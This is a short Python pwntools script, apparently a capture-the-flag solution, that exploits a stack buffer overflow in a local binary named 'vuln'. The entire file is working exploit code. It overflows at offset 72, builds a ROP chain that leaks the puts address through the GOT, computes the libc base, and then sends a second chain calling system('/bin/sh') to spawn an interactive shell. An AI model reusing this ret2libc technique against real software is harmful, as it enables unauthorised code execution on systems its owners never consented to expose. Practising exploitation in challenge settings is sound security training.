from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
context.binary = elf

# Force local process to use the supplied challenge libc.
r = process(elf.path, env={'LD_PRELOAD': libc.path}, stdin=PTY, stdout=PTY)

offset = 72

rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])


payload = [
    b'A' * offset,
    p64(0x000000000040101a), # ret
    rop.chain(),
    p64(0x0000000000401194) # main
]
payload = b''.join(payload)

r.recvuntil(b'> ')
r.sendline(payload)
delim = b'\nAzul! I want the (mot de pass) I need it\n> '
stage1 = r.recvuntil(delim)

leak_raw = stage1[:-len(delim)]
if leak_raw.startswith(b'Ciao!!!!\n'):
    leak_raw = leak_raw[len(b'Ciao!!!!\n'):]
puts = u64(leak_raw.ljust(8, b'\x00'))
print(f'puts: {hex(puts)}')

libc.address = puts - libc.symbols['puts']

rop = ROP(libc)
rop.call('system', [next(libc.search(b'/bin/sh\x00'))])


payload = [
    b'A' * offset,
    p64(0x000000000040101a), #ret
    rop.chain()
]

payload = b''.join(payload)

r.sendline(payload)

r.interactive()